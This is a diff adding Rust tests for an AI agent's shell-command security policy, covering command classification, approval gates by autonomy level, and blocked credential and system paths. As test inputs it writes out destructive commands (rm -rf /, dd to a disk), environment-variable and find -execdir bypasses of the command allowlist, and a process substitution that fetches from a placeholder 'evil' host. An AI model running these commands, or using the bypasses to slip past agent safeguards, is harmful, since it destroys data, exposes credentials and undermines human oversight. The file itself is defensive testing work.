@@ -79,6 +79,22 @@ fn enforce_tool_operation_act_uses_rate_budget() {
     assert!(err.contains("Rate limit exceeded"));
 }
 
+#[test]
+fn action_budget_error_mentions_limit_and_settings() {
+    let p = SecurityPolicy {
+        max_actions_per_hour: 0,
+        ..default_policy()
+    };
+
+    let err = p
+        .enforce_tool_operation(ToolOperation::Act, "write_file")
+        .unwrap_err();
+
+    assert!(err.contains("Rate limit exceeded: action budget exhausted"));
+    assert!(err.contains("0 actions/hour"));
+    assert!(err.contains("Settings -> Advanced -> Agent autonomy"));
+}
+
 // -- is_command_allowed -------------------------------------------
 
 #[test]
@@ -129,6 +145,17 @@ fn config_default_policy_includes_windows_read_equivalents() {
 }
 
 #[test]
+fn config_default_policy_allows_prompt_date_command() {
+    let cfg = crate::openhuman::config::AutonomyConfig::default();
+    let p = SecurityPolicy::from_config(&cfg, std::path::Path::new("."));
+
+    assert!(
+        p.is_command_allowed("date"),
+        "agent instructions use `shell date`, so the default runtime policy must allow it"
+    );
+}
+
+#[test]
 fn blocked_commands_basic() {
     let p = default_policy();
     assert!(!p.is_command_allowed("rm -rf /"));
@@ -148,10 +175,15 @@ fn readonly_blocks_all_commands() {
 }
 
 #[test]
-fn full_autonomy_still_uses_allowlist() {
+fn full_autonomy_bypasses_allowlist_but_validate_blocks_high_risk() {
     let p = full_policy();
+    // Full bypasses the allowlist: any base command passes is_command_allowed,
+    // including ones not in allowed_commands.
     assert!(p.is_command_allowed("ls"));
-    assert!(!p.is_command_allowed("rm -rf /"));
+    assert!(p.is_command_allowed("rm -rf /"));
+    // …but validate_command_execution still rejects high-risk commands while
+    // block_high_risk_commands is true (the default).
+    assert!(p.validate_command_execution("rm -rf /", false).is_err());
 }
 
 #[test]
@@ -225,19 +257,350 @@ fn command_risk_medium_for_mutating_commands() {
 }
 
 #[test]
-fn command_risk_high_for_dangerous_commands() {
-    let p = SecurityPolicy {
-        allowed_commands: vec!["rm".into()],
-        ..SecurityPolicy::default()
-    };
+fn command_risk_high_for_catastrophic_commands() {
+    let p = default_policy();
+    // Only catastrophic / irreversible / privilege / system-control are High.
+    assert_eq!(p.command_risk_level("rm -rf /"), CommandRiskLevel::High);
     assert_eq!(
-        p.command_risk_level("rm -rf /tmp/test"),
+        p.command_risk_level("dd if=/dev/zero of=/dev/sda"),
         CommandRiskLevel::High
+    );
+    assert_eq!(
+        p.command_risk_level("mkfs /dev/sda1"),
+        CommandRiskLevel::High
+    );
+    assert_eq!(
+        p.command_risk_level("shutdown -h now"),
+        CommandRiskLevel::High
+    );
+    assert_eq!(p.command_risk_level("sudo rm file"), CommandRiskLevel::High);
+    // An ordinary recursive delete of a relative path is NO LONGER high-risk
+    // (only the `rm -rf /…` absolute pattern is) — it's medium now.
+    assert_eq!(
+        p.command_risk_level("rm -rf build"),
+        CommandRiskLevel::Medium
+    );
+}
+
+// -- classify_command / gate_decision (fail-closed bucket model) --
+
+#[test]
+fn classify_reads_are_read() {
+    let p = default_policy();
+    for c in [
+        "ls -la",
+        "cat f",
+        "grep x f",
+        "git status",
+        "git log --oneline",
+        "pwd",
+        "wc -l f",
+        "head f",
+        "find . -name '*.rs'",
+        "cargo tree",
+        "npm ls",
+        "dir",
+        "type f.txt",
+        "Get-Content f",
+    ] {
+        assert_eq!(p.classify_command(c), CommandClass::Read, "{c}");
+    }
+}
+
+#[test]
+fn classify_unknown_is_write_fail_closed() {
+    let p = default_policy();
+    // The whole point: a command we don't recognize is NOT treated as read.
+    assert_eq!(p.classify_command("./deploy.sh"), CommandClass::Write);
+    assert_eq!(
+        p.classify_command("some-random-binary --go"),
+        CommandClass::Write
+    );
+    assert_eq!(p.classify_command("git"), CommandClass::Write); // bare git
+}
+
+#[test]
+fn classify_writes_are_write() {
+    let p = default_policy();
+    for c in [
+        "touch f",
+        "mkdir d",
+        "mv a b",
+        "rm -rf build",
+        "git commit -m x",
+        "git push",
+        "npm install",
+        "cargo build",
+        "node script.js",
+        "python3 x.py",
+        "bash -lc 'id'",
+        "Remove-Item x",
+    ] {
+        assert_eq!(p.classify_command(c), CommandClass::Write, "{c}");
+    }
+}
+
+#[test]
+fn classify_network_is_network() {
+    let p = default_policy();
+    for c in [
+        "curl http://x",
+        "wget http://x",
+        "ssh host",
+        "scp a b",
+        "nc -l 1",
+        "Invoke-WebRequest http://x",
+    ] {
+        assert_eq!(p.classify_command(c), CommandClass::Network, "{c}");
+    }
+}
+
+#[test]
+fn classify_destructive_is_destructive() {
+    let p = default_policy();
+    for c in [
+        "sudo rm f",
+        "dd if=/dev/zero of=/dev/sda",
+        "mkfs /dev/sda1",
+        "shutdown -h now",
+        "rm -rf /",
+        "format C:",
+        "diskpart",
+    ] {
+        assert_eq!(p.classify_command(c), CommandClass::Destructive, "{c}");
+    }
+}
+
+#[test]
+fn classify_highest_segment_wins() {
+    let p = default_policy();
+    assert_eq!(
+        p.classify_command("ls | curl http://x"),
+        CommandClass::Network
+    );
+    assert_eq!(
+        p.classify_command("cat f && sudo reboot"),
+        CommandClass::Destructive
+    );
+    assert_eq!(p.classify_command("ls && mkdir d"), CommandClass::Write);
+}
+
+#[test]
+fn classify_redirect_lifts_read_to_write() {
+    let p = default_policy();
+    // `cat` is read, but the redirect writes a file.
+    assert_eq!(p.classify_command("cat f"), CommandClass::Read);
+    assert_eq!(p.classify_command("cat f > out.txt"), CommandClass::Write);
+    assert_eq!(
+        p.classify_command("echo hi | tee out.txt"),
+        CommandClass::Write
     );
 }
 
 #[test]
-fn command_risk_high_for_command_executors() {
+fn gate_decision_readonly_blocks_acts() {
+    let p = readonly_policy();
+    assert_eq!(p.gate_decision(CommandClass::Read), GateDecision::Allow);
+    assert_eq!(p.gate_decision(CommandClass::Write), GateDecision::Block);
+    assert_eq!(p.gate_decision(CommandClass::Network), GateDecision::Block);
+    assert_eq!(
+        p.gate_decision(CommandClass::Destructive),
+        GateDecision::Block
+    );
+}
+
+#[test]
+fn gate_decision_supervised_prompts_every_act() {
+    let p = default_policy(); // Supervised
+    assert_eq!(p.gate_decision(CommandClass::Read), GateDecision::Allow);
+    assert_eq!(p.gate_decision(CommandClass::Write), GateDecision::Prompt);
+    assert_eq!(p.gate_decision(CommandClass::Network), GateDecision::Prompt);
+    assert_eq!(
+        p.gate_decision(CommandClass::Destructive),
+        GateDecision::Prompt
+    );
+}
+
+#[test]
+fn gate_decision_full_runs_write_but_prompts_network_and_destructive() {
+    let p = full_policy();
+    assert_eq!(p.gate_decision(CommandClass::Read), GateDecision::Allow);
+    assert_eq!(p.gate_decision(CommandClass::Write), GateDecision::Allow);
+    assert_eq!(p.gate_decision(CommandClass::Network), GateDecision::Prompt);
+    assert_eq!(
+        p.gate_decision(CommandClass::Destructive),
+        GateDecision::Prompt
+    );
+}
+
+// -- install chokepoint (Phase C) ---------------------------------
+
+#[test]
+fn classify_installs_are_install_bucket() {
+    let p = default_policy();
+    for c in [
+        "apt install jq",
+        "apt-get install -y curl",
+        "brew install ripgrep",
+        "pacman -S vim",
+        "pacman -Sy",
+        "pacman -Syu",
+        "apk add bash",
+        "dnf install nginx",
+        "pip install requests",
+        "pip3 install x",
+        "pipx install black",
+        "gem install rails",
+        "cargo install ripgrep",
+        "go install ./cmd/x",
+        "npm install -g typescript",
+        "pnpm add -g eslint",
+        "yarn global add prettier",
+    ] {
+        assert_eq!(p.classify_command(c), CommandClass::Install, "{c}");
+    }
+}
+
+#[test]
+fn classify_local_installs_are_write_not_install() {
+    let p = default_policy();
+    // Project-local installs are ordinary writes (run in Full), not the
+    // host-modifying Install bucket.
+    assert_eq!(p.classify_command("npm install"), CommandClass::Write);
+    assert_eq!(
+        p.classify_command("npm install lodash"),
+        CommandClass::Write
+    );
+    assert_eq!(p.classify_command("cargo add serde"), CommandClass::Write);
+}
+
+#[test]
+fn classify_pacman_readonly_queries_are_not_install() {
+    let p = default_policy();
+    // pacman's `-S` family includes read-only queries (search/info/list/groups/
+    // print). A blanket `starts_with("-s")` mis-bucketed these as always-ask
+    // Install; they must fall through to the fail-closed Write default instead.
+    for c in [
+        "pacman -Ss firefox", // search
+        "pacman -Si vim",     // info
+        "pacman -Sl core",    // list a repo
+        "pacman -Sg",         // list groups
+        "pacman -Sp vim",     // print download URLs
+    ] {
+        assert_eq!(p.classify_command(c), CommandClass::Write, "{c}");
+    }
+}
+
+#[test]
+fn gate_decision_install_always_asks_even_in_full() {
+    assert_eq!(
+        full_policy().gate_decision(CommandClass::Install),
+        GateDecision::Prompt
+    );
+    assert_eq!(
+        default_policy().gate_decision(CommandClass::Install),
+        GateDecision::Prompt
+    );
+    assert_eq!(
+        readonly_policy().gate_decision(CommandClass::Install),
+        GateDecision::Block
+    );
+}
+
+// -- cross-platform always-forbidden hardening (Phase E) ----------
+
+#[test]
+fn always_forbidden_blocks_credential_stores_case_insensitively() {
+    use std::path::Path;
+    for p in [
+        "/home/u/.ssh/id_rsa",
+        "/home/u/.SSH/id_rsa", // case-insensitive
+        "C:\\Users\\u\\.ssh\\id_rsa",
+        "/home/u/.gnupg/x",
+        "/home/u/.aws/credentials",
+        "/home/u/.azure/x",
+        "/home/u/.kube/config",
+        "/Users/u/Library/Keychains/login.keychain",
+        "C:\\Users\\u\\AppData\\Roaming\\Microsoft\\Protect\\x",
+        "C:\\Users\\u\\AppData\\Local\\Microsoft\\Credentials\\x",
+    ] {
+        assert!(SecurityPolicy::is_always_forbidden(Path::new(p)), "{p}");
+    }
+}
+
+#[test]
+fn always_forbidden_blocks_core_os_dirs_cross_platform() {
+    use std::path::Path;
+    for p in [
+        "/etc/passwd",
+        "/root/.bashrc",
+        "/boot/x",
+        "/proc/1",
+        "/sys/x",
+        "/System/Library/x",
+        "C:\\Windows\\System32\\config",
+        "C:\\WINDOWS\\x", // case-insensitive
+        "C:\\Program Files\\App\\x",
+        "C:\\ProgramData\\secret",
+    ] {
+        assert!(SecurityPolicy::is_always_forbidden(Path::new(p)), "{p}");
+    }
+}
+
+#[test]
+fn always_forbidden_leaves_gray_area_dirs_to_overridable_forbidden_paths() {
+    use std::path::Path;
+    // NOT unconditional — a trusted_root grant may reach these (e.g.
+    // /usr/local, /opt, ~/Library, project dirs).
+    for p in [
+        "/usr/local/bin/tool",
+        "/opt/app/x",
+        "/var/data/x",
+        "/Users/u/Library/Application Support/x",
+        "/home/u/projects/myrepo/src/main.rs",
+        "C:\\Users\\u\\projects\\app\\src",
+    ] {
+        assert!(!SecurityPolicy::is_always_forbidden(Path::new(p)), "{p}");
+    }
+}
+
+// -- LLM escalate-only category (Phase G) -------------------------
+
+#[test]
+fn parse_declared_class_maps_known_and_rejects_unknown() {
+    assert_eq!(
+        SecurityPolicy::parse_declared_class("destructive"),
+        Some(CommandClass::Destructive)
+    );
+    assert_eq!(
+        SecurityPolicy::parse_declared_class("  WRITE "),
+        Some(CommandClass::Write)
+    );
+    assert_eq!(
+        SecurityPolicy::parse_declared_class("network"),
+        Some(CommandClass::Network)
+    );
+    assert_eq!(
+        SecurityPolicy::parse_declared_class("install"),
+        Some(CommandClass::Install)
+    );
+    assert_eq!(SecurityPolicy::parse_declared_class("bogus"), None);
+    assert_eq!(SecurityPolicy::parse_declared_class(""), None);
+    // Escalate-only contract: max() raises but never lowers.
+    assert_eq!(
+        CommandClass::Write.max(CommandClass::Destructive),
+        CommandClass::Destructive
+    );
+    assert_eq!(
+        CommandClass::Destructive.max(CommandClass::Read),
+        CommandClass::Destructive
+    );
+}
+
+#[test]
+fn command_risk_medium_for_command_executors() {
+    // Interpreters / code executors are medium-risk now (not high): a coding
+    // agent must be able to run them — prompted in Supervised, allowed in Full.
     let p = default_policy();
     for command in [
         "xargs rm",
@@ -254,8 +617,8 @@ fn command_risk_high_for_command_executors() {
     ] {
         assert_eq!(
             p.command_risk_level(command),
-            CommandRiskLevel::High,
-            "{command} should be high risk"
+            CommandRiskLevel::Medium,
+            "{command} should be medium risk"
         );
     }
 }
@@ -339,10 +702,10 @@ fn validate_command_does_not_panic_on_multibyte_char_at_log_truncation_boundary(
         "command should be blocked, but did not panic"
     );
 
-    // And the high-risk-blocked path: allowlist passes (curl is allowed), then
-    // risk gate fires (curl is a high-risk command), exercising the truncating
+    // And the high-risk-blocked path: allowlist passes (dd is allowed), then
+    // risk gate fires (dd is a high-risk command), exercising the truncating
     // warn! site at the block_high_risk_commands branch.
-    let prefix = "curl https://example.com/";
+    let prefix = "dd if=/dev/zero of=/dev/";
     let filler = "a".repeat(80 - prefix.len() - 1);
     let high_risk_cmd = format!("{prefix}{filler}魔");
     assert!(
@@ -350,7 +713,7 @@ fn validate_command_does_not_panic_on_multibyte_char_at_log_truncation_boundary(
         "fixture must straddle byte 80 with a multi-byte char"
     );
     let high_risk_policy = SecurityPolicy {
-        allowed_commands: vec!["curl".into()],
+        allowed_commands: vec!["dd".into()],
         ..SecurityPolicy::default()
     };
     let blocked = high_risk_policy.validate_command_execution(&high_risk_cmd, true);
@@ -748,6 +1111,10 @@ fn command_argument_injection_blocked() {
     // find -exec is a common bypass
     assert!(!p.is_command_allowed("find . -exec rm -rf {} +"));
     assert!(!p.is_command_allowed("find / -ok cat {} \\;"));
+    // -execdir / -okdir have identical command-execution semantics — same cwd
+    // bypass class, different option spelling.
+    assert!(!p.is_command_allowed("find /tmp -maxdepth 1 -name poc_proof.txt -execdir whoami \\;"));
+    assert!(!p.is_command_allowed("find /etc -name passwd -okdir head -3 {} \\;"));
     // git config/alias can execute commands
     assert!(!p.is_command_allowed("git config core.editor \"rm -rf /\""));
     assert!(!p.is_command_allowed("git alias.st status"));
@@ -756,6 +1123,61 @@ fn command_argument_injection_blocked() {
     assert!(p.is_command_allowed("find . -name '*.txt'"));
     assert!(p.is_command_allowed("git status"));
     assert!(p.is_command_allowed("git add ."));
+}
+
+#[test]
+fn dangerous_env_var_prefix_blocked() {
+    let p = default_policy();
+    // GIT_PAGER / PAGER / GIT_SSH_COMMAND / GIT_EXTERNAL_DIFF / EDITOR all
+    // cause git or other allowed binaries to spawn the assigned value as a
+    // subprocess. The bare command (`git log`, `git status`, `git diff`)
+    // is allowlisted, but the env prefix shifts execution to an arbitrary
+    // command.
+    assert!(!p.is_command_allowed("GIT_PAGER=/tmp/payload.sh git log"));
+    assert!(!p.is_command_allowed("PAGER=calc.exe git log"));
+    assert!(!p.is_command_allowed("GIT_SSH_COMMAND=/tmp/x git fetch"));
+    assert!(!p.is_command_allowed("GIT_EXTERNAL_DIFF=/tmp/x git diff"));
+    assert!(!p.is_command_allowed("EDITOR=/tmp/x git commit"));
+    assert!(!p.is_command_allowed("VISUAL=/tmp/x git commit"));
+    assert!(!p.is_command_allowed("LESS=/tmp/x cat /etc/passwd"));
+    assert!(!p.is_command_allowed("LESSOPEN=/tmp/x cat /etc/passwd"));
+    assert!(!p.is_command_allowed("MANPAGER=/tmp/x man bash"));
+    assert!(!p.is_command_allowed("BAT_PAGER=/tmp/x bat file"));
+    assert!(!p.is_command_allowed("BROWSER=/tmp/x git status"));
+    // Loader-override variables let an attacker inject a library into the
+    // next process.
+    assert!(!p.is_command_allowed("LD_PRELOAD=/tmp/x.so git status"));
+    assert!(!p.is_command_allowed("LD_LIBRARY_PATH=/tmp git status"));
+    assert!(!p.is_command_allowed("LD_AUDIT=/tmp/x.so git status"));
+    assert!(!p.is_command_allowed("DYLD_INSERT_LIBRARIES=/tmp/x.dylib git status"));
+    assert!(!p.is_command_allowed("DYLD_LIBRARY_PATH=/tmp git status"));
+    assert!(!p.is_command_allowed("DYLD_FORCE_FLAT_NAMESPACE=1 git status"));
+    // Shell-evaluation variables.
+    assert!(!p.is_command_allowed("BASH_ENV=/tmp/x git status"));
+    assert!(!p.is_command_allowed("ENV=/tmp/x git status"));
+    assert!(!p.is_command_allowed("PROMPT_COMMAND=/tmp/x git status"));
+    assert!(!p.is_command_allowed("IFS=$'\\n' git status"));
+    // Python startup hook + path override.
+    assert!(!p.is_command_allowed("PYTHONSTARTUP=/tmp/x python3 -V"));
+    assert!(!p.is_command_allowed("PYTHONPATH=/tmp python3 -V"));
+    // PATH / SHELL overrides redirect resolution of the next binary.
+    assert!(!p.is_command_allowed("PATH=/tmp git status"));
+    assert!(!p.is_command_allowed("SHELL=/tmp/x git status"));
+    // Lower-case spellings still match (env names are case-insensitive
+    // by convention here — most shells uppercase them, but the matcher
+    // should not be fooled by case folding).
+    assert!(!p.is_command_allowed("git_pager=/tmp/x git log"));
+    // Case-insensitive: should also catch mixed-case names.
+    assert!(!p.is_command_allowed("Ld_PrElOaD=/tmp/x.so git status"));
+
+    // Benign env prefixes still pass: TZ, LANG, LC_ALL, custom names that
+    // don't trigger downstream subprocess execution.
+    assert!(p.is_command_allowed("TZ=UTC git log"));
+    assert!(p.is_command_allowed("LANG=en_US.UTF-8 git log"));
+    assert!(p.is_command_allowed("LC_ALL=C git status"));
+    assert!(p.is_command_allowed("FOO=bar git status"));
+    // No env prefix at all — unchanged.
+    assert!(p.is_command_allowed("git status"));
 }
 
 #[test]
@@ -1238,8 +1660,12 @@ fn validate_command_truncates_secrets_in_allowlist_miss_error() {
         "Err return leaked the secret past the 80-char truncation boundary: {err}"
     );
     assert!(
-        err.starts_with("Command not allowed by security policy: "),
-        "Err return should still carry the policy-decision prefix: {err}"
+        err.starts_with(crate::openhuman::security::POLICY_BLOCKED_MARKER),
+        "hard block should lead with the recognizable policy marker: {err}"
+    );
+    assert!(
+        err.contains("Command not allowed by security policy: "),
+        "Err return should still carry the policy-decision text: {err}"
     );
 }
 
@@ -1537,5 +1963,274 @@ async fn validate_parent_path_expands_tilde_before_workspace_join() {
     assert!(
         err.contains("Resolved parent path escapes workspace"),
         "expected workspace-escape error (tilde correctly expanded); got: {err}"
+    );
+}
+
+// -- trusted_roots allow-list (Phase 1) ---------------------------
+
+use std::fs;
+use std::path::Path as StdPath;
+use std::path::PathBuf as StdPathBuf;
+
+fn trusted_policy(workspace: StdPathBuf, roots: Vec<TrustedRoot>) -> SecurityPolicy {
+    SecurityPolicy {
+        autonomy: AutonomyLevel::Supervised,
+        workspace_dir: workspace,
+        workspace_only: true,
+        trusted_roots: roots,
+        ..SecurityPolicy::default()
+    }
+}
+
+/// (workspace_dir, outside_dir) under a fresh temp root.
+fn ws_and_outside() -> (tempfile::TempDir, StdPathBuf, StdPathBuf) {
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let workspace = tmp.path().join("workspace");
+    let outside = tmp.path().join("outside");
+    fs::create_dir_all(&workspace).unwrap();
+    fs::create_dir_all(&outside).unwrap();
+    (tmp, workspace, outside)
+}
+
+#[tokio::test]
+async fn trusted_read_root_allows_read_outside_workspace() {
+    let (_tmp, workspace, outside) = ws_and_outside();
+    let file = outside.join("data.txt");
+    fs::write(&file, "hi").unwrap();
+    let policy = trusted_policy(
+        workspace,
+        vec![TrustedRoot {
+            path: outside.to_string_lossy().into_owned(),
+            access: TrustedAccess::Read,
+        }],
+    );
+    let resolved = policy.validate_path(file.to_str().unwrap()).await;
+    assert!(
+        resolved.is_ok(),
+        "read in trusted root should succeed: {resolved:?}"
+    );
+}
+
+#[tokio::test]
+async fn trusted_read_root_blocks_write() {
+    let (_tmp, workspace, outside) = ws_and_outside();
+    let policy = trusted_policy(
+        workspace,
+        vec![TrustedRoot {
+            path: outside.to_string_lossy().into_owned(),
+            access: TrustedAccess::Read,
+        }],
+    );
+    let target = outside.join("new.txt");
+    let err = policy
+        .validate_parent_path(target.to_str().unwrap())
+        .await
+        .expect_err("write into a read-only trusted root must be rejected");
+    assert!(err.contains("escapes workspace"), "got: {err}");
+}
+
+#[tokio::test]
+async fn trusted_readwrite_root_allows_write() {
+    let (_tmp, workspace, outside) = ws_and_outside();
+    let policy = trusted_policy(
+        workspace,
+        vec![TrustedRoot {
+            path: outside.to_string_lossy().into_owned(),
+            access: TrustedAccess::ReadWrite,
+        }],
+    );
+    let target = outside.join("new.txt");
+    let resolved = policy.validate_parent_path(target.to_str().unwrap()).await;
+    assert!(
+        resolved.is_ok(),
+        "write in ReadWrite trusted root should succeed: {resolved:?}"
+    );
+}
+
+#[tokio::test]
+async fn credential_dir_blocked_even_inside_trusted_root() {
+    let (_tmp, workspace, outside) = ws_and_outside();
+    let ssh = outside.join(".ssh");
+    fs::create_dir_all(&ssh).unwrap();
+    let key = ssh.join("id_rsa");
+    fs::write(&key, "SECRET").unwrap();
+    // Grant the entire `outside` tree read+write …
+    let policy = trusted_policy(
+        workspace,
+        vec![TrustedRoot {
+            path: outside.to_string_lossy().into_owned(),
+            access: TrustedAccess::ReadWrite,
+        }],
+    );
+    // … the credential store inside it must still be unreachable.
+    let err = policy
+        .validate_path(key.to_str().unwrap())
+        .await
+        .expect_err("~/.ssh-style dir must stay blocked even inside a trusted root");
+    assert!(
+        err.contains("not allowed") || err.contains("credential"),
+        "got: {err}"
+    );
+}
+
+#[tokio::test]
+async fn path_outside_workspace_and_roots_blocked() {
+    let (_tmp, workspace, outside) = ws_and_outside();
+    let file = outside.join("data.txt");
+    fs::write(&file, "hi").unwrap();
+    // No trusted roots granted — outside the workspace stays blocked.
+    let policy = trusted_policy(workspace, vec![]);
+    let err = policy
+        .validate_path(file.to_str().unwrap())
+        .await
+        .expect_err("ungranted path outside workspace must be blocked");
+    assert!(
+        err.contains("not allowed") || err.contains("escapes"),
+        "got: {err}"
+    );
+}
+
+#[test]
+fn is_within_trusted_root_write_requires_readwrite() {
+    let policy = trusted_policy(
+        StdPathBuf::from("/ws"),
+        vec![TrustedRoot {
+            path: "/data".into(),
+            access: TrustedAccess::Read,
+        }],
+    );
+    assert!(policy.is_within_trusted_root(StdPath::new("/data/sub/x"), false));
+    assert!(!policy.is_within_trusted_root(StdPath::new("/data/sub/x"), true));
+    assert!(!policy.is_within_trusted_root(StdPath::new("/elsewhere/x"), false));
+}
+
+#[test]
+fn trusted_root_never_matches_credential_components() {
+    let policy = trusted_policy(
+        StdPathBuf::from("/ws"),
+        vec![TrustedRoot {
+            path: "/home/me".into(),
+            access: TrustedAccess::ReadWrite,
+        }],
+    );
+    assert!(policy.is_within_trusted_root(StdPath::new("/home/me/proj/file"), false));
+    assert!(!policy.is_within_trusted_root(StdPath::new("/home/me/.aws/credentials"), false));
+}
+
+// -- Full access bypasses the command allowlist (access modes) ---------------
+
+#[test]
+fn full_access_bypasses_command_allowlist() {
+    let p = full_policy();
+    // `mkdir` is NOT in the default allowed_commands, but Full bypasses the allowlist.
+    assert!(p.is_command_allowed("mkdir -p foo/bar"));
+    // Redirects / pipes / subshells that Supervised blocks are allowed under Full.
+    assert!(p.is_command_allowed("ls -la 2>/dev/null || echo none"));
+    assert!(p.is_command_allowed("echo hi > out.txt"));
+    assert!(p.is_command_allowed("python3 build.py && node serve.js"));
+}
+
+#[test]
+fn supervised_still_enforces_command_allowlist() {
+    let p = default_policy(); // Supervised
+    assert!(!p.is_command_allowed("mkdir -p foo/bar")); // not allow-listed
+    assert!(!p.is_command_allowed("ls 2>/dev/null")); // redirect blocked
+    assert!(p.is_command_allowed("ls -la")); // allow-listed, no redirect
+}
+
+#[test]
+fn full_access_still_blocks_high_risk_when_configured() {
+    // Full bypasses the allowlist in is_command_allowed, but validate_command_execution
+    // still blocks high-risk commands while block_high_risk_commands is true.
+    let p = full_policy();
+    assert!(p.is_command_allowed("rm -rf /"));
+    let result = p.validate_command_execution("rm -rf /", false);
+    assert!(
+        result.is_err(),
+        "high-risk command must still be blocked in Full when block_high_risk_commands=true"
+    );
+}
+
+#[test]
+fn supervised_runs_approved_redirects_but_blocks_hidden_execution() {
+    // Regression for the "approved shell command never runs" loop: redirects
+    // like `2>&1` / `2>/dev/null` / `> file` and pipes MUST NOT be hard-blocked
+    // in Supervised. `classify_command` already lifts a redirect to Write so the
+    // gate prompted on it; once the human approves, `check_gated_command` (run
+    // inside the tool, after approval) must let the command actually run.
+    let p = default_policy(); // Supervised
+    assert!(
+        p.check_gated_command("python3 -c \"import yfinance\" 2>&1")
+            .is_ok(),
+        "stderr-dup redirect 2>&1 must run after approval"
+    );
+    assert!(p
+        .check_gated_command("pip show yfinance 2>/dev/null")
+        .is_ok());
+    assert!(p.check_gated_command("ls -la | grep foo").is_ok());
+    assert!(p.check_gated_command("echo done > out.txt").is_ok());
+
+    // Hidden execution that `classify_command` can't see (it only reads each
+    // segment's base command) stays blocked outside Full:
+    assert!(
+        p.check_gated_command("echo $(rm -rf ~)").is_err(),
+        "command substitution can hide an unseen command"
+    );
+    assert!(p.check_gated_command("echo `whoami`").is_err());
+    assert!(p.check_gated_command("cat <(curl http://evil/sh)").is_err());
+    assert!(
+        p.check_gated_command("sleep 100 & rm -rf important")
+            .is_err(),
+        "a standalone & can run a second command the prompt wouldn't show"
+    );
+
+    // Full is documented full-trust and skips the structural guard entirely.
+    assert!(full_policy().check_gated_command("echo $(date)").is_ok());
+}
+
+/// The default projects home (`~/OpenHuman/projects`) must always be a
+/// read-write trusted root on a policy built from config — `from_config` is the
+/// one autonomy→policy chokepoint every agent session uses, so the grant can't
+/// depend on the channels-startup path (skipped on web-chat-only cores).
+#[test]
+fn from_config_grants_default_projects_dir_as_readwrite_root() {
+    let cfg = crate::openhuman::config::AutonomyConfig::default();
+    let policy = SecurityPolicy::from_config(&cfg, StdPath::new("/tmp/ws"));
+    let projects = crate::openhuman::config::default_projects_dir()
+        .to_string_lossy()
+        .to_string();
+    assert!(
+        policy
+            .trusted_roots
+            .iter()
+            .any(|r| r.path == projects && matches!(r.access, TrustedAccess::ReadWrite)),
+        "from_config must grant {projects} as a read-write trusted root; got: {:?}",
+        policy.trusted_roots
+    );
+}
+
+/// A user-granted projects root is left untouched (no duplicate, access kept).
+#[test]
+fn from_config_does_not_duplicate_user_granted_projects_root() {
+    let projects = crate::openhuman::config::default_projects_dir()
+        .to_string_lossy()
+        .to_string();
+    let cfg = crate::openhuman::config::AutonomyConfig {
+        trusted_roots: vec![TrustedRoot {
+            path: projects.clone(),
+            access: TrustedAccess::Read,
+        }],
+        ..crate::openhuman::config::AutonomyConfig::default()
+    };
+    let policy = SecurityPolicy::from_config(&cfg, StdPath::new("/tmp/ws"));
+    let matches: Vec<_> = policy
+        .trusted_roots
+        .iter()
+        .filter(|r| r.path == projects)
+        .collect();
+    assert_eq!(matches.len(), 1, "must not duplicate an existing entry");
+    assert!(
+        matches!(matches[0].access, TrustedAccess::Read),
+        "must preserve the user-granted access level"
     );
 }
